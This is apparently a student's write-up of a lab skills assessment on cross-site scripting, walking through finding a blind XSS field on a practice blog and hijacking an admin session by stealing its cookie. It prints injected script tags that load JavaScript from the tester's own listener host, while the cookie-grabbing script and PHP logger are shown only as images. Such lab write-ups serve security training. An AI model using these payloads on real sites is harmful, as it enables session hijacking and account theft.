---
title: 'Skills Assessment:'
updated: 2023-08-26T10:42:45.0000000+01:00
created: 2023-08-26T09:50:25.0000000+01:00
---

![image1](../../../../_resources/image1-198.png)

1.  First we need to find a user-input field that is vulnerable to an XSS vulnerability.
2.  Find a working XSS payload.
3.  Perform a Session Hijacking attack.

Finding user-input field:

Firstly we want to navigate to: <http://10.129.202.156/assessment/>.
![image2](../../../../_resources/image2-164.png)

From this is looks like it is a good idea to try either the **search feature** or the **comment feature:**

Search:
<http://10.129.202.156/assessment/?s=fd>

Comment:
<http://10.129.202.156/assessment/index.php/2021/06/11/welcome-to-security-blog/?unapproved=6&moderation-hash=68858fa66281f984fcd47e8668eeb3ae#comment-6>

We can first try and use our basic XSS payload of: **\<script\>alert(window.origin)\</script\>** - which doesn't work.

Using **XSStrike** on the search feature, we can see many payloads that should work, lets test it until we get a working payload.

Also, we don't know if the attack vector is **blind XSS** meaning we should try spin up a server if payloads seem ineffective.

**Testing for blind XSS:**
1.  Start a netcat or php listener - ideally PHP
    1.  ![image3](../../../../_resources/image3-129.png)
2.  Test fields by trying XSS payloads to our IP
    1.  **"\>\<script src=http://10.10.16.22:80/\[field_name\]\>\</script\>**
    2.  Note that we should also try various prefixes, since we don't know what will break the source code
        1.  \<script …
        2.  '\<script …
        3.  "\<script …
    3.  In our context this would be:
        1.  **"\>\<script src=http://10.10.16.22:80/?s\>\</script\>**
3.  You know that you will have a blind XSS when, you get requests to your listener:
    1.  ![image4](../../../../_resources/image4-104.png)
    2.  After we customise the requests:
    3.  ![image5](../../../../_resources/image5-80.png)
        1.  We can see that the website field is vulnerable to blind XSS.
            1.  ![image6](../../../../_resources/image6-57.png)

So now that we know that a field is vulnerable to blind XSS, we can generate a payload to steal the admin credentials.
Writing our payload:

So we need to write a JavaScript payload so that our listener can capture the cookie from the current document:

Script.js (in our listener location):
![image7](../../../../_resources/image7-50.png)

Then we need to write a PHP script to write the cookie data to a text file:

Index.php (in our listener location)
![image8](../../../../_resources/image8-43.png)

Then we restart our php listener.

Finally we can send our payload:
![image9](../../../../_resources/image9-36.png)
*If you get duplicate comment detected, just add some random text to the front of the comment.*

We then get the following response:
![image10](../../../../_resources/image10-30.png)

We can also see the flag in our **cookies.txt:**
![image11](../../../../_resources/image11-23.png)

